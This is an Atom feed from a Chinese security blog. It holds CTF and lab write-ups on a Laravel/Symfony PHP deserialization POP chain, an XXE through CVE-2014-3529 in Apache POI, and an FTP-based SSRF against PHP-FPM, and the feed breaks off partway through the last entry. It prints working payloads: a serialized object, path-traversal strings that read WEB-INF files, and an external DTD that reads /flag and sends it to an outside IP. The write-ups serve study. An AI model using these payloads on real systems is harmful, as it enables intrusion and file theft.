<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>inanb</title>
  
  <subtitle>昨夜雨疏风骤 浓睡不消残酒</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-01-18T08:36:25.271Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>inanb</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CISCN2019-总决赛-Day1-Web4-Laravel1</title>
    <link href="http://example.com/2022/01/18/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4-Laravel1/"/>
    <id>http://example.com/2022/01/18/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4-Laravel1/</id>
    <published>2022-01-18T08:05:42.927Z</published>
    <updated>2022-01-18T08:36:25.271Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>[CISCN2019 总决赛 Day1 Web4]Laravel1 php审计</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#1%E5%AE%A1%E8%AE%A1">1.审计</a></li><li><a href="#2-%E6%9E%84%E9%80%A0">2. 构造</a></li></ul><!-- tocstop --></div><br>#### 1.审计<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">\Illuminate\Http\Request $request</span>)</span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$payload=$request-&gt;input(&quot;payload&quot;);</code> 指可以提交payload参数，后面对payload进行反序列化</p><p>down源码审计：</p><p>找入口挺玄妙的，根据代码先找一些特殊的魔术方法</p><p>搜索destruct</p><img src="/images/post-1 - 副本/image-20220118161243779.png" alt="image-20220118161243779" style="zoom:80%;"><p>可以发现2019的一份日志中指向了一个类，也许算是提示……？不清楚</p><p><code>__destruct</code> -&gt; <code>commit</code> -&gt; <code>invalidateTags</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span>(<span class="params"><span class="keyword">array</span> $tags</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ok = <span class="literal">true</span>;</span><br><span class="line">        $tagsByKey = [];</span><br><span class="line">        $invalidatedTags = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($tags <span class="keyword">as</span> $tag) &#123;</span><br><span class="line">            CacheItem::validateKey($tag);</span><br><span class="line">            $invalidatedTags[$tag] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">            $items = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">            <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item)) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[$key]);</span><br><span class="line">                    $ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $f = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">            $tagsByKey = $f($items);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">        &#125;</span><br><span class="line">  ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;pool</code> 可控, 这就使我们有机会控制 <code>saveDeferred</code> 函数</p><blockquote><p>在大型项目中，接口作为开发的规范，不同的功能实现要求必须实现某些函数</p><p>大量同名函数的出现，扩大了攻击面，但要从中找到可能出现问题的那一个，…困难</p></blockquote><p><code>PhpArrayAdapter.php</code> 中的 <code>saveDeferred</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span>(<span class="params">CacheItemInterface $item</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> === <span class="keyword">$this</span>-&gt;values) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;keys[$item-&gt;getKey()]) &amp;&amp; <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>initialize</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $values = (<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file) ?: [[], []];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> !== \count($values) || !<span class="keyword">isset</span>($values[<span class="number">0</span>], $values[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="keyword">$this</span>-&gt;keys, <span class="keyword">$this</span>-&gt;values) = $values;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$values = (include $this-&gt;file) ?: [[], []];</code> 这里发现了文件包含</p><h4><span id="2-构造">2. 构造</span></h4><p>大量复杂的命名空间也是难点之一, <code>saveDeferred(CacheItemInterface $item)</code> 要求传入一个接口的实现</p><p>调出接口的实现关系：</p><img src="/images/post-1 - 副本/image-20220118162702481.png" alt="image-20220118162702481" style="zoom:80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>;</span><br><span class="line"></span><br><span class="line">***</span><br><span class="line"> </span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span> <span class="keyword">implements</span> <span class="title">ItemInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">***</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在可以构造pop链了，注意命名空间：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#这两个类都是在Symfony\Component\Cache\Adapter命名空间下的</span></span><br><span class="line"><span class="comment">#而Cacheitem类则不在同一个类下。所以我们得新建一个命名空间。并且use导入</span></span><br><span class="line"><span class="comment">// 不同的类需要正确设置命名空间    </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// defer</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 构造</span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred;</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">&#x27;xxx&#x27;</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a=<span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?payload&#x3D;O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>参考文章:<br><a href="https://guokeya.github.io/post/iG-_evz93/">https://guokeya.github.io/post/iG-_evz93/</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;[CISCN2019 总决赛 Day1 Web4]Laravel1 php审计&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯-2020-青龙组-filejava</title>
    <link href="http://example.com/2022/01/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/"/>
    <id>http://example.com/2022/01/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-filejava/</id>
    <published>2022-01-17T03:58:13.222Z</published>
    <updated>2022-01-18T08:33:41.697Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>[网鼎杯 2020 青龙组] filejava webinf </p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#web-inf">WEB-INF</a></li><li><a href="#%E5%8F%8D%E7%BC%96%E8%AF%91">反编译</a></li><li><a href="#cve-2014-3529">CVE-2014-3529</a></li><li><a href="#excel-%E4%B8%8E-xml">excel 与 xml</a></li><li><a href="#attack">attack</a></li></ul><!-- tocstop --></div><br>[xml 注入详解](https://www.cnblogs.com/backlion/p/9302528.html)<p>DownloadServlet 负责处理下载逻辑，测试目录穿越：</p><p>tomcat 报错，并爆出webinf路径，</p><p><code>/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/15/6/.. (Is a directory)</code></p><h4><span id="web-inf">WEB-INF</span></h4><blockquote><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。</p><p>如果想在页面中直接访问其中的文件，必须通过 web.xml 对要访问的文件进行相应映射才能访问。</p><p>/WEB-INF/web.xml</p><p><strong>Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。对后端逻辑进行映射，也可以考虑为路由设置。</strong></p><p>/WEB-INF/classes/</p><p><strong>包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）。通过反编译，可以得到泄露的java源码。</strong></p><p>/WEB-INF/lib/</p><p>存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。</p><p>/WEB-INF/src/</p><p>源码目录，按照包名结构放置各个java文件。</p><p>/WEB-INF/database.properties</p><p>数据库配置文件</p><p>/WEB-INF/tags/</p><p>存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：&lt;%@ taglibprefix=”tags” tagdir=”/WEB-INF /simpleTags” % &gt;。</p><p>/WEB-INF/jsp/</p><p>jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。</p><p>/WEB-INF/jsp2/</p><p>与 jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件，当然，它也是可以任意命名的，同样为区别 Jsp 1.2以下版本的文件目录，通常才命名为 jsp2。</p><p>META-INF</p><p>相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务</p><p>manifest.mf文件，在用jar打包时自动生成。</p></blockquote><h4><span id="反编译">反编译</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;web.xml</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot;</span><br><span class="line">         version&#x3D;&quot;4.0&quot;&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;DownloadServlet&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">    &lt;&#x2F;servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;DownloadServlet&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;DownloadServlet&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;ListFileServlet&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">    &lt;&#x2F;servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;ListFileServlet&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;ListFileServlet&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;UploadServlet&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">    &lt;&#x2F;servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;UploadServlet&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;UploadServlet&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br><span class="line">&lt;&#x2F;web-app&gt;</span><br></pre></td></tr></table></figure><p>可以看到路由以及对应的servlet配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</span><br></pre></td></tr></table></figure><p>依次拿到字节码文件，使用<code>jd-gui</code>进行反编译</p><h4><span id="cve-2014-3529">CVE-2014-3529</span></h4><img src="/images/网鼎杯-2020-青龙组-filejava/image-20220117124502798.png" alt="image-20220117124502798" style="zoom:80%;"><p>这里是主要的漏洞点，提示了poi-ooxml-3.10</p><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3529">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3529</a></p><blockquote><p>Apache POI 3.10.1之前版本中的OPC SAX设置允许远程攻击者通过包含XML外部实体声明和实体引用的OpenXML文件读取任意文件，该文件与XML外部实体（XXE）问题有关。</p></blockquote><p>这里解析的是excel文件</p><h4><span id="excel-与-xml">excel 与 xml</span></h4><blockquote><p><a href="https://www.cnblogs.com/tinytiny/p/3356900.html">https://www.cnblogs.com/tinytiny/p/3356900.html</a></p><p>Excel底层的工作空间和保存数据的形式就是用的XML格式的数据,你可以把.xls后缀或.xlsx后缀改为任意一种压缩格式的后缀(.rar .zip)试试</p></blockquote><p>解析excel，就要解析其中的xml，而POI 3.10.1允许了在其中进行外部DTD包含，导致注入</p><h4><span id="attack">attack</span></h4><p>修改 [Content_Types].xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;file.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>在vps上放置一个dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.98.199.11:7777?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在7777起监听，接收flag：</p><img src="/images/网鼎杯-2020-青龙组-filejava/image-20220117125247999.png" alt="image-20220117125247999" style="zoom:80%;">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;[网鼎杯 2020 青龙组] filejava webinf &lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>实验--通过FTP_SSRF_攻击PHP-FPM</title>
    <link href="http://example.com/2021/11/09/%E5%AE%9E%E9%AA%8C--%E9%80%9A%E8%BF%87FTP_SSRF_%E6%94%BB%E5%87%BBPHP-FPM/"/>
    <id>http://example.com/2021/11/09/%E5%AE%9E%E9%AA%8C--%E9%80%9A%E8%BF%87FTP_SSRF_%E6%94%BB%E5%87%BBPHP-FPM/</id>
    <published>2021-11-09T14:59:16.144Z</published>
    <updated>2021-11-24T13:59:46.122Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>通过受害机请求恶意FTP服务，攻击内网中脆弱的FPM服务</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E5%AE%9E%E9%AA%8C-%E9%80%9A%E8%BF%87ftp_ssrf_%E6%94%BB%E5%87%BBphp-fpm">实验–通过FTP_SSRF_攻击PHP-FPM</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87-ssrf">环境准备-SSRF</a></li><li><a href="#%E5%8E%9F%E7%90%86%E5%87%86%E5%A4%87">原理准备</a><ul><li><a href="#file_get_contents-file_put_contents">file_get_contents &amp; file_put_contents</a></li><li><a href="#php-fpm-%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE">PHP-FPM 发送数据</a></li></ul></li><li><a href="#%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B">攻击过程</a><ul><li><a href="#payload">payload</a></li><li><a href="#%E6%81%B6%E6%84%8F-ftp-%E6%9C%8D%E5%8A%A1">恶意 FTP 服务</a></li><li><a href="#%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC">开启监听</a></li><li><a href="#ssrf">SSRF</a></li></ul></li><li><a href="#%E6%8B%93%E5%B1%95">拓展</a><ul><li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%81%B6%E6%84%8F-ftp-%E6%9C%8D%E5%8A%A1">简单的恶意 FTP 服务</a></li><li><a href="#%E6%94%BB%E5%87%BB">攻击</a></li></ul></li></ul></li></ul><!-- tocstop --></div><br>### 实验--通过FTP_SSRF_攻击PHP-FPM<h4><span id="环境准备-ssrf">环境准备-SSRF</span></h4><p><code>file.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$contents = file_get_contents($_GET[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">file_put_contents($_GET[<span class="string">&#x27;viewFile&#x27;</span>], $contents);</span><br></pre></td></tr></table></figure><blockquote><p>实验环境：</p><p>攻击机：kali-linux-2020.3     IP：192.168.64.129</p><p>服务机：Ubuntu 20                IP：192.168.64.128</p><p>其他环境条件请看前置文章</p></blockquote><h4><span id="原理准备">原理准备</span></h4><h5><span id="file_get_contents-amp-file_put_contents">file_get_contents &amp; file_put_contents</span></h5><p>file_get_contents 函数把整个文件读入一个字符串中。</p><p>file_put_contents() 函数把一个字符串写入文件中。file_put_contents不会自动创建目录。</p><blockquote><p>与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</p></blockquote><p>同样的，类似的函数支持许多强大的文件传输协议，php，file，data……以及<strong>ftp</strong></p><h5><span id="php-fpm-发送数据">PHP-FPM 发送数据</span></h5><p>​        如果我们能<strong>向 PHP-FPM 发送一个任意的二进制数据包</strong>，就可以在机器上执行代码。这种技术经常与gopher://协议结合使用，curl支持gopher://协议，但file_get_contents却不支持。</p><p>​        另一个已知的允许通过 TCP 发送二进制数据包的协议是<strong>FTP</strong>，更准确的说是该协议的<strong>被动模式</strong>，即：如果一个客户端试图从FTP服务器上读取一个文件（或写入），<strong>服务器会通知客户端将文件的内容读取（或写）到一个有服务端指定的IP和端口上</strong>。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。</p><p>那么，对于file.php：</p><blockquote><p><code>viewFile=ftp://evil-server/file.txt</code></p><ul><li>首先通过 file_get_contents() 函数连接到我们的FTP服务器，并下载file.txt。</li><li>然后再通过 file_put_contents() 函数连接到我们的FTP服务器，并将其上传回file.txt。</li></ul><p>我们将使用 FTP 协议的被动模式让 file_get_contents() 在我们的服务器上下载一个文件，当它试图使用 file_put_contents() 把它上传回去时，我们将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF。</p></blockquote><h4><span id="攻击过程">攻击过程</span></h4><h5><span id="payload">payload</span></h5><p>使用gopherus生成攻击fastcgi的payload：</p><img src="/images/实验--通过FTP_SSRF_攻击PHP-FPM/image-20211109231157981.png" alt="image-20211109231157981" style="zoom:80%;"><p>截取<code>_</code>后的数据段</p><h5><span id="恶意-ftp-服务">恶意 FTP 服务</span></h5><blockquote><p><a 